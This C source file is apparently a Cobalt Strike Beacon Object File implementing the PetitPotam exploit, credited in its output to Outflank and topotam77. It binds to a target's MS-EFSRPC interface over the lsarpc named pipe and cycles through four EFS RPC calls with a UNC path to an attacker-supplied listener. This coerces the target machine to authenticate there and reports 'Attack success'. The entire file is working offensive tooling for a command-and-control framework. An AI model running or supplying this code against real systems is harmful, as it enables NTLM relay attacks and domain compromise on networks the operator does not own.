#include <windows.h>

#include "common/beacon.h"
#include "common/bofdefs.h"

#if defined(WOW64)
#include "ms-efsrpc_c_x86.h"
#else
#include "ms-efsrpc_c.h"
#endif

#define BUF_SIZE 512

#ifndef _countof
#define _countof(a) (sizeof(a) / sizeof((a)[0]))
#endif

void __RPC_FAR* __RPC_USER midl_user_allocate(size_t len) {
	return(MSVCRT$malloc(len));
}

void __RPC_USER midl_user_free(void __RPC_FAR* ptr) {
	MSVCRT$free(ptr);
}

long EfsRpcOpenFileRaw(
	/* [in] */ handle_t binding_h,
	/* [out] */ PEXIMPORT_CONTEXT_HANDLE *hContext,
	/* [string][in] */ wchar_t *FileName,
	/* [in] */ long Flags)
{

	CLIENT_CALL_RETURN _RetVal;
	RPC_BINDING_HANDLE efsrpc__MIDL_AutoBindHandle;

	const RPC_CLIENT_INTERFACE efsrpc___RpcClientInterface =
		{
		sizeof(RPC_CLIENT_INTERFACE),
		{{0xc681d488,0xd850,0x11d0,{0x8c,0x52,0x00,0xc0,0x4f,0xd9,0x0f,0x7e}},{1,0}},
		{{0x8A885D04,0x1CEB,0x11C9,{0x9F,0xE8,0x08,0x00,0x2B,0x10,0x48,0x60}},{2,0}},
		0,
		0,
		0,
		0,
		0,
		0x00000001
		};

	const MIDL_STUB_DESC efsrpc_StubDesc =
		{
		(void *)& efsrpc___RpcClientInterface,
		MIDL_user_allocate,
		MIDL_user_free,
		&efsrpc__MIDL_AutoBindHandle,
		0,
		0,
		0,
		0,
		ms2Defsrpc__MIDL_TypeFormatString.Format,
		1, /* -error bounds_check flag */
		0x50002, /* Ndr library version */
		0,
		0x801026e, /* MIDL Version 8.1.622 */
		0,
		0,
		0,  /* notify & notify_flag routine table */
		0x1, /* MIDL flag */
		0, /* cs routines */
		0,   /* proxy/server info */
		0
		};

#if defined(WOW64)
	_RetVal = RPCRT4$NdrClientCall2(
		(PMIDL_STUB_DESC)&efsrpc_StubDesc,
		(PFORMAT_STRING)&ms2Defsrpc__MIDL_ProcFormatString.Format[0],
		(unsigned char*)&binding_h);
#else
	_RetVal = RPCRT4$NdrClientCall2(
		(PMIDL_STUB_DESC)&efsrpc_StubDesc,
		(PFORMAT_STRING)&ms2Defsrpc__MIDL_ProcFormatString.Format[0],
		binding_h,
		hContext,
		FileName,
		Flags);
#endif

	return (long)_RetVal.Simple;
}

DWORD EfsRpcQueryRecoveryAgents(
	/* [in] */ handle_t binding_h,
	/* [string][in] */ wchar_t *FileName,
	/* [out] */ ENCRYPTION_CERTIFICATE_HASH_LIST **RecoveryAgents)
{

	CLIENT_CALL_RETURN _RetVal;
	RPC_BINDING_HANDLE efsrpc__MIDL_AutoBindHandle;

	const RPC_CLIENT_INTERFACE efsrpc___RpcClientInterface =
		{
		sizeof(RPC_CLIENT_INTERFACE),
		{{0xc681d488,0xd850,0x11d0,{0x8c,0x52,0x00,0xc0,0x4f,0xd9,0x0f,0x7e}},{1,0}},
		{{0x8A885D04,0x1CEB,0x11C9,{0x9F,0xE8,0x08,0x00,0x2B,0x10,0x48,0x60}},{2,0}},
		0,
		0,
		0,
		0,
		0,
		0x00000001
		};

	const MIDL_STUB_DESC efsrpc_StubDesc =
		{
		(void *)& efsrpc___RpcClientInterface,
		MIDL_user_allocate,
		MIDL_user_free,
		&efsrpc__MIDL_AutoBindHandle,
		0,
		0,
		0,
		0,
		ms2Defsrpc__MIDL_TypeFormatString.Format,
		1, /* -error bounds_check flag */
		0x50002, /* Ndr library version */
		0,
		0x801026e, /* MIDL Version 8.1.622 */
		0,
		0,
		0,  /* notify & notify_flag routine table */
		0x1, /* MIDL flag */
		0, /* cs routines */
		0,   /* proxy/server info */
		0
		};

#if defined(WOW64)
	_RetVal = RPCRT4$NdrClientCall2(
		(PMIDL_STUB_DESC)&efsrpc_StubDesc,
		(PFORMAT_STRING)&ms2Defsrpc__MIDL_ProcFormatString.Format[316],
		(unsigned char*)&binding_h);
#else
	_RetVal = RPCRT4$NdrClientCall2(
		(PMIDL_STUB_DESC)&efsrpc_StubDesc,
		(PFORMAT_STRING)&ms2Defsrpc__MIDL_ProcFormatString.Format[330],
		binding_h,
		FileName,
		RecoveryAgents);
#endif

	return (DWORD)_RetVal.Simple;
}

DWORD EfsRpcEncryptFileSrv(
	/* [in] */ handle_t binding_h,
	/* [string][in] */ wchar_t *FileName)
{
	CLIENT_CALL_RETURN _RetVal;
	RPC_BINDING_HANDLE efsrpc__MIDL_AutoBindHandle;

	const RPC_CLIENT_INTERFACE efsrpc___RpcClientInterface =
		{
		sizeof(RPC_CLIENT_INTERFACE),
		{{0xc681d488,0xd850,0x11d0,{0x8c,0x52,0x00,0xc0,0x4f,0xd9,0x0f,0x7e}},{1,0}},
		{{0x8A885D04,0x1CEB,0x11C9,{0x9F,0xE8,0x08,0x00,0x2B,0x10,0x48,0x60}},{2,0}},
		0,0,0,0,0,0x00000001
		};

	const MIDL_STUB_DESC efsrpc_StubDesc =
		{
		(void *)& efsrpc___RpcClientInterface,
		MIDL_user_allocate, MIDL_user_free,
		&efsrpc__MIDL_AutoBindHandle,
		0,0,0,0,
		ms2Defsrpc__MIDL_TypeFormatString.Format,
		1, 0x50002, 0, 0x801026e, 0, 0, 0, 0x1, 0, 0, 0
		};

#if defined(WOW64)
	_RetVal = RPCRT4$NdrClientCall2(
		(PMIDL_STUB_DESC)&efsrpc_StubDesc,
		(PFORMAT_STRING)&ms2Defsrpc__MIDL_ProcFormatString.Format[184],
		(unsigned char*)&binding_h);
#else
	_RetVal = RPCRT4$NdrClientCall2(
		(PMIDL_STUB_DESC)&efsrpc_StubDesc,
		(PFORMAT_STRING)&ms2Defsrpc__MIDL_ProcFormatString.Format[192],
		binding_h,
		FileName);
#endif
	return (DWORD)_RetVal.Simple;
}

DWORD EfsRpcDecryptFileSrv(
	/* [in] */ handle_t binding_h,
	/* [string][in] */ wchar_t *FileName,
	/* [in] */ unsigned long OpenFlag)
{
	CLIENT_CALL_RETURN _RetVal;
	RPC_BINDING_HANDLE efsrpc__MIDL_AutoBindHandle;

	const RPC_CLIENT_INTERFACE efsrpc___RpcClientInterface =
		{
		sizeof(RPC_CLIENT_INTERFACE),
		{{0xc681d488,0xd850,0x11d0,{0x8c,0x52,0x00,0xc0,0x4f,0xd9,0x0f,0x7e}},{1,0}},
		{{0x8A885D04,0x1CEB,0x11C9,{0x9F,0xE8,0x08,0x00,0x2B,0x10,0x48,0x60}},{2,0}},
		0,0,0,0,0,0x00000001
		};

	const MIDL_STUB_DESC efsrpc_StubDesc =
		{
		(void *)& efsrpc___RpcClientInterface,
		MIDL_user_allocate, MIDL_user_free,
		&efsrpc__MIDL_AutoBindHandle,
		0,0,0,0,
		ms2Defsrpc__MIDL_TypeFormatString.Format,
		1, 0x50002, 0, 0x801026e, 0, 0, 0, 0x1, 0, 0, 0
		};

#if defined(WOW64)
	_RetVal = RPCRT4$NdrClientCall2(
		(PMIDL_STUB_DESC)&efsrpc_StubDesc,
		(PFORMAT_STRING)&ms2Defsrpc__MIDL_ProcFormatString.Format[224],
		(unsigned char*)&binding_h);
#else
	_RetVal = RPCRT4$NdrClientCall2(
		(PMIDL_STUB_DESC)&efsrpc_StubDesc,
		(PFORMAT_STRING)&ms2Defsrpc__MIDL_ProcFormatString.Format[234],
		binding_h,
		FileName,
		OpenFlag);
#endif
	return (DWORD)_RetVal.Simple;
}

RPC_STATUS CreateBindingHandle(_In_ LPWSTR lpwTarget, _Out_ RPC_BINDING_HANDLE* binding_handle) {
	RPC_STATUS rStatus;
	RPC_BINDING_HANDLE v5;
	RPC_SECURITY_QOS SecurityQOS = { 0 };
	RPC_WSTR StringBinding = NULL;
	RPC_BINDING_HANDLE Binding;
	SEC_WINNT_AUTH_IDENTITY AuthIdentity = { 0 };

	StringBinding = 0;
	Binding = 0;

	rStatus = RPCRT4$RpcStringBindingComposeW((RPC_WSTR)L"c681d488-d850-11d0-8c52-00c04fd90f7e", (RPC_WSTR)L"ncacn_np", (RPC_WSTR)lpwTarget, (RPC_WSTR)L"\\pipe\\lsarpc", (RPC_WSTR)NULL, &StringBinding);
	if (rStatus == RPC_S_OK) {
		rStatus = RPCRT4$RpcBindingFromStringBindingW(StringBinding, &Binding);
		if (!rStatus) {
			SecurityQOS.Version = 1;
			SecurityQOS.ImpersonationType = RPC_C_IMP_LEVEL_IMPERSONATE;
			SecurityQOS.Capabilities = RPC_C_QOS_CAPABILITIES_DEFAULT;
			SecurityQOS.IdentityTracking = RPC_C_QOS_IDENTITY_STATIC;

			rStatus = RPCRT4$RpcBindingSetAuthInfoExW(Binding, 0, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_WINNT, 0, 0, (RPC_SECURITY_QOS*)&SecurityQOS);
			if (rStatus == RPC_S_OK) {
				v5 = Binding;
				Binding = 0;
				*binding_handle = v5;
				BeaconPrintf(CALLBACK_OUTPUT, "[>] RPC Binding successful.");
			}
		}
	}
	if (Binding) {
		RPCRT4$RpcBindingFree(&Binding);
	}

	if (StringBinding) {
		RPCRT4$RpcStringFreeW(&StringBinding);
	}

	return rStatus;
}


void go(char *args, int len) {
	datap parser;
	BeaconDataParse(&parser, args, len);

	char *listener = BeaconDataExtract(&parser, NULL);
	char *target = BeaconDataExtract(&parser, NULL);

	if (listener == NULL || target == NULL) {
		BeaconPrintf(CALLBACK_ERROR, "Usage: petitpotam <listener> <target>");
		return;
	}

	HRESULT hr = S_OK;
	CLIENT_CALL_RETURN _RetVal;
	LPWSTR lpwListener = NULL;
	LPWSTR lpwTarget = NULL;
	WCHAR wcRPCTarget[BUF_SIZE] = L"\\\\";
	WCHAR wcFileName[BUF_SIZE] = { 0 };
	LONG lFlag = 0;

	RPC_BINDING_HANDLE bHandle;
	RPC_STATUS rStatus = RPC_S_NO_BINDINGS;
	PEXIMPORT_CONTEXT_HANDLE pContextHandle = NULL;
	ENCRYPTION_CERTIFICATE_HASH_LIST* pEncCertHashList = NULL;

	int listenerLen = KERNEL32$MultiByteToWideChar(CP_ACP, 0, listener, -1, NULL, 0);
	lpwListener = (LPWSTR)MSVCRT$malloc(listenerLen * sizeof(WCHAR));
	KERNEL32$MultiByteToWideChar(CP_ACP, 0, listener, -1, lpwListener, listenerLen);

	int targetLen = KERNEL32$MultiByteToWideChar(CP_ACP, 0, target, -1, NULL, 0);
	lpwTarget = (LPWSTR)MSVCRT$malloc(targetLen * sizeof(WCHAR));
	KERNEL32$MultiByteToWideChar(CP_ACP, 0, target, -1, lpwTarget, targetLen);

	if (lpwListener == NULL || lpwTarget == NULL) {
		BeaconPrintf(CALLBACK_ERROR, "Failed to allocate memory for arguments");
		return;
	}

	BeaconPrintf(CALLBACK_OUTPUT, "[>] PetitPotam exploit by Cneelis @Outflank");
	BeaconPrintf(CALLBACK_OUTPUT, "[>] Based on original code by @topotam77");
	BeaconPrintf(CALLBACK_OUTPUT, "[>] Listener: %ls | Target: %ls", lpwListener, lpwTarget);

	MSVCRT$wcscat_s(wcRPCTarget, _countof(wcRPCTarget), lpwTarget);
	rStatus = CreateBindingHandle(wcRPCTarget, &bHandle);
	if (rStatus != RPC_S_OK) {
		BeaconPrintf(CALLBACK_ERROR, "RPC Binding failed (status: %ld)", rStatus);
		goto Done;
	}

	MSVCRT$swprintf_s(wcFileName, _countof(wcFileName), L"\\\\%ls\\C$\\Windows\\Temp\\tmpBla.tmp", lpwListener);

	BeaconPrintf(CALLBACK_OUTPUT, "[>] Trying EfsRpcEncryptFileSrv (opnum 4)...");
	hr = EfsRpcEncryptFileSrv(bHandle, wcFileName);
	if (hr == ERROR_BAD_NETPATH) {
		BeaconPrintf(CALLBACK_OUTPUT, "[>] Attack success via EfsRpcEncryptFileSrv!");
		goto Done;
	}
	BeaconPrintf(CALLBACK_OUTPUT, "[>] EfsRpcEncryptFileSrv returned: %ld", hr);

	BeaconPrintf(CALLBACK_OUTPUT, "[>] Trying EfsRpcDecryptFileSrv (opnum 5)...");
	hr = EfsRpcDecryptFileSrv(bHandle, wcFileName, 0);
	if (hr == ERROR_BAD_NETPATH) {
		BeaconPrintf(CALLBACK_OUTPUT, "[>] Attack success via EfsRpcDecryptFileSrv!");
		goto Done;
	}
	BeaconPrintf(CALLBACK_OUTPUT, "[>] EfsRpcDecryptFileSrv returned: %ld", hr);

	BeaconPrintf(CALLBACK_OUTPUT, "[>] Trying EfsRpcOpenFileRaw (opnum 0)...");
	hr = EfsRpcOpenFileRaw(bHandle, &pContextHandle, wcFileName, lFlag);
	if (hr == ERROR_BAD_NETPATH) {
		BeaconPrintf(CALLBACK_OUTPUT, "[>] Attack success via EfsRpcOpenFileRaw!");
		goto Done;
	}
	BeaconPrintf(CALLBACK_OUTPUT, "[>] EfsRpcOpenFileRaw returned: %ld", hr);

	BeaconPrintf(CALLBACK_OUTPUT, "[>] Trying EfsRpcQueryRecoveryAgents (opnum 7)...");
	hr = EfsRpcQueryRecoveryAgents(bHandle, wcFileName, &pEncCertHashList);
	if (hr == ERROR_BAD_NETPATH) {
		BeaconPrintf(CALLBACK_OUTPUT, "[>] Attack success via EfsRpcQueryRecoveryAgents!");
		goto Done;
	}
	BeaconPrintf(CALLBACK_OUTPUT, "[>] EfsRpcQueryRecoveryAgents returned: %ld", hr);

	BeaconPrintf(CALLBACK_ERROR, "All methods failed. Last error: %ld", hr);

Done:
	MSVCRT$free(lpwListener);
	MSVCRT$free(lpwTarget);
	return;
}
